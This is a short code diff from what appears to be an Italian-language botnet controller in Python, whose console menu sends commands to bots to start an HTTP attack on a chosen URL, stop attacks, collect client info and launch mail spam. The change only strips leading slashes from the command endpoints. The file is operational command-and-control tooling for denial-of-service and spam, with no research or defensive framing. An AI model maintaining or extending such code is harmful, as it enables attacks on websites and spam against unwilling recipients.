@@ -68,9 +68,9 @@ def handle_console(e):
         elif scelta == 2:
             send_http_request()
         elif scelta == 3:
-            find_bot(path='/stop-attack', method="GET")
+            find_bot(path='stop-attack', method="GET")
         elif scelta == 4:
-            find_bot(path='/client-info', method="GET")
+            find_bot(path='client-info', method="GET")
         elif scelta == 5:
             mail_spam()
         else:
@@ -123,7 +123,7 @@ def send_http_request():
 
             url = urls[int(input()) - 1]
 
-            find_bot(path='/attack', method="POST", json={
+            find_bot(path='attack', method="POST", json={
                 'url': url
             })
 
@@ -154,7 +154,7 @@ def mail_spam():
             "message": message,
             "mail_object": mail_object
         }
-        find_bot(path='/mail-spam', method="POST", json=data)
+        find_bot(path='mail-spam', method="POST", json=data)
 
 
 def find_bot(path, method, json=None):
